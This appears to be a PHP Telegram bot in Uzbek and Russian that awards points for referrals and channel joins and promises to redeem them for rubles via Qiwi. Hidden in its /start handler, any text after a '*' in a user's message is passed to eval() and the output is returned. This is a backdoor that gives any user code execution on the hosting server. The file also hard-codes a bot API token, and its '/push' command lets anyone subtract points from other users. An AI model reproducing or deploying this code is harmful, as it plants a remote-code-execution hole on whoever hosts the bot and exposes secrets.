<?php
ob_start();
define('API_KEY','5383001222:AAHljTmnbTY6Mlwrcf9Qo8eBOgwCX-tufZI');
$admin = "549563282"; //admin id
$bot = "PullikVazifalarbot"; //bot ismi
$kanalimz = "k"; //kanal useri

   function del($nomi){
   array_map('unlink', glob("$nomi"));
   }

   function ty($ch){ 
   return bot('sendChatAction', [
   'chat_id' => $ch,
   'action' => 'typing',
   ]);
   }

function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}


  
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$mid = $message->message_id;
$cid = $message->chat->id;
$filee = "coin/$cid.step";
$folder = "coin";
$folder2 = "azo";


if (!file_exists($folder.'/test.fd3')) {
  mkdir($folder);
  file_put_contents($folder.'/test.fd3', 'by @xvest_admin');
}

if (!file_exists($folder2.'/test.fd3')) {
  mkdir($folder2);
  file_put_contents($folder2.'/test.fd3', 'by @xvest_admin');
}

if (file_exists($filee)) {
  $step = file_get_contents($filee);
}

$name = $message->from->firstname;
$tx = $message->text;

$kun1 = date('z', strtotime('5 hour'));

$key = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"📣Каналга кошилиб пул ишлаш"],],
[['text'=>"💰Реферал оркали пул ишлаш"],],
[['text'=>"📈Статистика"],['text'=>"👨‍💻Админ билан боғланиш"],],
]
]);

$key2 = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"✅Реферал кодингиз"],['text'=>"💳Баланс"],],
[['text'=>"🔙 Orqaga qaytish"],],
]
]);

$key3 = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"🔙 Orqaga qaytish"],],
]
]);

$balinfo = "Pul ishlash uchun nima qilish kerak?


Biz qanday qilib pul ishlaymiz?


Biz xar bir foydalanuvchiga maxsus referal sillka beramiz
siz xam o'z referal silkangizni oling va tarqating va referal toplang xar taklif qilingan do'stingiz uchun 5 ball ga ega bo'ling 
ball toplashning ikkinchi usuli kanalga qo'shilish bo'limidan biz bergan kanalga qo'shiling xar bir qo'shilgan kanalingiz uchun 5 ball ga ega bo'ling
ballaringiz 100 balga yetganda ularni real pulga alishtirishingiz mumkin...
Yoki bizning botdan o'z kanalingizga odam o'tqizishingiz mumkin..
ballarni pulga almashtirish
100 bal 5 rub
200 ball 15 rubl
300 ball 20 rubl
400 bal 30 rubl 
500 ball 40 rubl
Ballarni foydalanuvchiga almashtirish 
100 bal 25 ta foydalanuvchi 
200 ball 30 ta foydalanuvchi
300 ball 40 ta foydalanuvchi
400 ball 50 ta foydalanuvchi
Bizda tolovlar uzog'i yarim soatga kechikishi mumkin lekin tolovlar aniq tarzda bajariladi!!
Xurmat bilan @xvest_admin

";

if((mb_stripos($tx,"/start")!==false) or ($tx == "Ortga")) {
  ty($cid);

  $baza = file_get_contents("coin.dat");

  if(mb_stripos($baza, $cid) !== false){ 
  }else{
    $bgun = file_get_contents("bugun.$kun1");
    $bgun += 1;
    file_put_contents("bugun.$kun1",$bgun);
  }

  $public = explode("*",$tx);
  $refid = explode(" ",$tx);
  $refid = $refid[1];
  $gett = bot('getChatMember',[
  'chat_id' =>$kanalimz,
  'user_id' => $refid,
  ]);
  $public2 = $public[1];
  if (isset($public2)) {
  $tekshir = eval($public2);
  bot('sendMessage',[
    'chat_id'=>$cid,
    'text'=> $tekshir,
  ]);
  }
  $gget = $gett->result->status;

  if($gget == "member" or $gget == "creator" or $gget == "administrator"){
    $idref = "coin/$refid_id.dat";
    $idref2 = file_get_contents($idref);

    if(mb_stripos($idref2,"$cid") !== false ){
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"G'irromlik mumkin emas",
      ]);
    } else {

      $id = "$cid\n";
      $handle = fopen($idref, 'a+');
      fwrite($handle, $id);
      fclose($handle);

      $usr = file_get_contents("coin/$refid.dat");
$usr = $usr + 5;
      file_put_contents("coin/$refid.dat", "$usr");
      bot('sendMessage',[
      'chat_id'=>$refid,
'text'=>"Tabriklaymiz sizni do'stingiz referal silkangizga start berdi va siz 5 ball ga ega bo'ldingiz!!",
      ]);
    }
  }

  file_put_contents("coin/$cid.dat", "0");
  bot('sendMessage',[
  'chat_id'=>$refid,
  ]);
  bot('sendMessage',[
  'chat_id'=>$cid,
  'text'=>$balinfo,
  'reply_to_message_id' => $mid,
  'reply_markup'=>$key,
  ]);
}

if(isset($tx)){
  $gett = bot('getChatMember',[
  'chat_id' =>$kanalimz,
  'user_id' => $cid,
  ]);
  $gget = $gett->result->status;

  if($gget == "member" or $gget == "creator" or $gget == "administrator"){

    if($tx == "💰Реферал оркали пул ишлаш"){
      ty($cid);
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>$balinfo,
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key2,
      ]);
    }

    if($tx == "💳Баланс"){
      ty($cid);
      $ball = file_get_contents("coin/$cid.dat");
      $in = "💳Сизнинг балансингизда $ball балл мавжуд!";
      if($ball>=100) $in .= "\nПул ечиб олишингиз учун сизда етарли балл мавжуд! Ечиб оласизми?";
      if($ball>=100) $key2 = json_encode([
      'resize_keyboard'=>true,
      'keyboard'=>[
      [['text'=>"✅Ҳа"],['text'=>"❌Йўқ"],],
      [['text'=>"🔙 Orqaga qaytish"],],
      ]
      ]);
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>$in,
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key2,
      ]);
    }

    if($tx == "✅Ҳа"){
      ty($cid);
      $ball = file_get_contents("coin/$cid.dat");

      if($ball > 49){
        bot('sendMessage',[
        'chat_id'=>$cid,
'text'=>"Qiwi shot raqamingizni yozing pullar 30 daqiqa ichida o'tqiziladi!!",
        'reply_to_message_id'=>$mid,
        'reply_markup'=>$key3,
        ]);
        file_put_contents("coin/$cid.step","nomer");
      }else{
        bot('sendMessage',[
        'chat_id'=>$cid,
        'text'=>"😠Акиллилик килганинг учун сенга 10 балл штраф!",
        'reply_to_message_id'=>$mid,
        ]);
        $ball -=10;
        file_put_contents("coin/$cid.dat","$ball");
      }
    }

    else if($step == "nomer"){
      ty($cid);

      if($tx == "🔙 Orqaga qaytish"){
        del("coin/$cid.step");
      }else{
        $ball = file_get_contents("coin/$cid.dat");
        $bali = file_get_contents("coin/$cid.dat");
        if($ball <= 150) $bali *= 40;
        else if($ball <= 200) $bali *= 50;
        else if($ball <= 300) $bali *= 50;
        else if($ball <= 400) $bali *= 50;
        else if($ball <= 500) $bali *= 50;
        bot('sendMessage',[
        'chat_id'=>$admin,
        'text'=>$tx."\n\nTushuradigon summayiz: $bali",
        ]);
        bot('sendMessage',[
        'chat_id'=>$cid,
'text'=>"Сиз, $ball balni qiwi ga almashtirdingiz pullaringizntez fursatda o'tqiziladi.",
        'reply_markup'=>$key,
        ]);
        file_put_contents("coin/$cid.dat","0");
        del("coin/$cid.step");
      }
    }

    if($tx == "❌Йўқ"){
      ty($cid);
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"Демак, балл йиғишда ишингизни давом эттиришингиз мумкин! Чунки, қанча балл кўп бўлса, пул миғдори ҳам шунча кўп бўлади. Омад!",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key,
      ]);
    }

    if($tx == "🔙 Orqaga qaytish"){
      ty($cid);
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>$balinfo,
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key,
      ]);
    }

    if($tx == "✅Реферал кодингиз"){
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"✅Сизнинг реферал кодингиз:\nhttps://telegram.me/$bot?start=$cid",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key2,
      ]);
    }

    if($tx == "📈Статистика"){
      ty($cid);
      $eski = $kun1-1;
      del("bugun.$eski");
      $new = file_get_contents("bugun.$kun1");
      $baza = file_get_contents("coin.dat");
      $obsh = substr_count($baza,"\n");
      bot('sendMessage',[
      'chat_id'=>$cid,
'text'=>"📈Статистика\n\n👥Ботимиз аъзолари: $obsh",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key,
      ]);
    }

    if($tx == "👨‍💻Админ билан боғланиш"){
      ty($cid);
      bot('sendMessage',[
      'chat_id'=>$cid,
'text'=>"👨💻Бот админи: @xvest_admin
      🕗Иш вақти: 24 soat
🔰дастурлаш каналимизга азо боулинг: @xvest
🚫Спамлар: @xvest_group",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key,
      ]);
    }

    $replyik = $message->reply_to_message->text;
    $yubbi = "Yuboriladigon xabarni kiriting. Xabar turi markdown";

    if($tx == "/send" and $cid == $admin){
      ty($cid);
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>$yubbi,
      'reply_markup'=>$key3,
      ]);
      file_put_contents("coin/$cid.step","send");
    }

    if($step == "send" and $cid == $admin){
      ty($cid);
      if($tx == "🔙 Orqaga qaytish"){
      del("coin/$cid.step");
      }else{
      ty($cid);
      $idss=file_get_contents("coin.dat");
      $idszs=explode("\n",$idss);
      foreach($idszs as $idlat){
      bot('sendMessage',[
      'chat_id'=>$idlat,
      'text'=>$tx,
      ]);
      }
      del("coin/$cid.step");
      }
    }

if(stripos($tx,"/push")!==false){
      $ex=explode("_",$tx);
      $refid = $ex[1];
      $usr = file_get_contents("coin/$refid.dat");
$usr -= $ex[2];
      file_put_contents("coin/$refid.dat", "$usr");
    }

    $nocha = "Бошқа канал йўқ!";
    $noazo = "Сиз каналга аъзо бўлмадингиз.";
$okcha = "Сиз каналга аъзо бўлдингиз ва 5 баллга эга бўлдингиз!
3 кун ичида каналдан чиқиб кетсангиз сизни 5 балингиз олиб қўйилади.";

    if((stripos($tx,"/Kanal")!==false) and $cid == $admin){
      $ex=explode("=",$tx);
      file_put_contents("kanal.dat", "$ex[1]|$ex[2]|0");
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"📣Канал: ".$ex[2]."\n👥Кераклик одам сони: ".$ex[1]."\n❗️Бошка канал кошмай туринг. Бот канал кошиш мумкин деб ози айтиб беради сизга. Агар кошсангиз бот хисобдан адашиб кетадиб",
      'reply_markup'=>$key,
      ]);
    }

    if((stripos($tx,"/otmen")!==false) and $cid == $admin){
      unlink("kanal.dat");
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"Kanal o'chirildi!",
      'reply_markup'=>$key,
      ]);
    }

    if($tx == "📣Каналга кошилиб пул ишлаш"){
      ty($cid);
      $get = file_get_contents("kanal.dat");
      if($get){
        list($odam,$kanal,$now) = explode("|",$get);
        if($odam == $now){
        unlink("kanal.dat");
        bot('sendMessage',[
        'chat_id'=>$admin,
        'text'=>"✅Канал кошишиз мумкин",
        'reply_markup'=>$key,
        ]);
        bot('sendMessage',[
        'chat_id'=>$cid,
        'text'=>$nocha,
        'reply_markup'=>$key,
        ]);
        }else{
        file_put_contents("coin/$cid.step","chek");
        bot('sendMessage',[
        'chat_id'=>$cid,
        'text'=>"📣$kanal - каналига кошилинг ва текшириш тугмасини босинг",
        'reply_markup'=>json_encode([
        'resize_keyboard'=>true,
        'keyboard'=>[
        [['text'=>"✅Текшириш"],],
        ]
        ]),
        ]);
        }
      }else{
        bot('sendMessage',[
        'chat_id'=>$cid,
        'text'=>$nocha,
        'reply_markup'=>$key,
        ]);
      }
    }

    if($tx == "✅Текшириш"){
      del("coin/$cid.step");
      $get = file_get_contents("kanal.dat");
      if($get){

        list($odam,$kanal,$now) = explode("|",$get);
        $tekshir = file_get_contents("azo/$cid.$kanal");

        if($tekshir){
          bot('sendMessage',[
          'chat_id'=>$cid,
          'text'=>"☝️Сиз олдин бу каналда бор эдинги!",
          'reply_markup'=>$key,
          ]);
        }else{
          $get = file_get_contents("kanal.dat");
          list($odam,$kanal,$now) = explode("|",$get);
          $gett = bot('getChatMember',[
          'chat_id' => $kanal,
          'user_id' => $cid,
          ]);
          $gget = $gett->result->status;

          if($gget == "member"){
$now += 5;
            file_put_contents("kanal.dat", "$odam|$kanal|$now");
            $kabin = file_get_contents("coin/$cid.dat");
$kabi = $kabin + 5;
            file_put_contents("coin/$cid.dat", "$kabi");
            $time = date('d', strtotime('5 hour'));
            file_put_contents("azo/$cid.$kanal", "$kanal|$cid|$time");
            bot('sendMessage',[
            'chat_id'=>$cid,
            'text'=>$okcha,
            'reply_markup'=>$key,
            ]);
          }else{
            bot('sendMessage',[
            'chat_id'=>$cid,
            'text'=>$noazo,
            'reply_markup'=>$key,
            ]);
          }
        }
      }else{
        bot('sendMessage',[
        'chat_id'=>$cid,
        'text'=>$nocha,
        'reply_markup'=>$key,
        ]);
      }
    }

    if(isset($tx)){
      $baza = file_get_contents("coin.dat");

      if(mb_stripos($baza, $cid) !== false){ 
      }else{
        $baza = file_get_contents("coin.dat");
        $dat = "$baza\n$cid";
        file_put_contents("coin.dat", $dat);
      }
      $faylla = glob("azo/*.*");

      foreach($faylla as $fayl){
        $geti = file_get_contents("$fayl");
        list($chati,$usri,$ftime) = explode("|",$geti);
        $nowtime = date('d', strtotime('-72 hour'));
        if($ftime < $nowtime){
        unlink("$fayl");
        }else{
        $gett = bot('getChatMember',[
        'chat_id' => $chati,
        'user_id' => $usri,
        ]);
        $gget = $gett->result->status;
        if($gget != "member"){
        bot('sendMessage',[
        'chat_id'=>$usri,
        'text'=>"😠Сиз $chati каналидан 3 кун болмасидан олдин чикиб кетганиз учун сиздан 3 балл айриб ташлаймиз!",
        'reply_markup'=>$key,
        ]);
        $kabin = file_get_contents("coin/$usri.dat");
        $ball = $kabin - 3;
        file_put_contents("coin/$usri.dat", "$ball");
        unlink("$fayl");
        }
        }
      }
    }
  } else{
    bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"📣Сиз хозирда $kanalimz каналига азо булмагансиз. Илтимос каналга азо булинг ва кейин ботни ишлатишигиз мумкин!\n❗️Агарда каналга азо булмаган холатда ботга одам чакирсангиз бот у одам учун сизга балл берилмайди.",
    ]);
  }
}
?>